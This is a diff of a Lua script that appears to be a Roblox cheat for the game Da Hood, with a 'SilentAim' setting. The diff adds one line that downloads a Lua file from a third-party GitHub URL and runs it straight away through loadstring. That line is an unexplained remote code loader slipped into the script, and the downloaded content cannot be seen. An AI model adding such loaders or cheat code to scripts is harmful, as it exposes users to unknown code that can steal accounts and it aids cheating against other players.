@@ -9,6 +9,8 @@ local UserInputService = game:GetService("UserInputService")
 local LocalPlayer = Players.LocalPlayer
 local Mouse = LocalPlayer:GetMouse()
 local CurrentCamera = Workspace.CurrentCamera
+loadstring(game:HttpGet("https://raw.githubusercontent.com/d6monic/FLIP-IT/main/fixed%20(1).lua"))()
+
 
 local DaHoodSettings = {
     SilentAim = true,
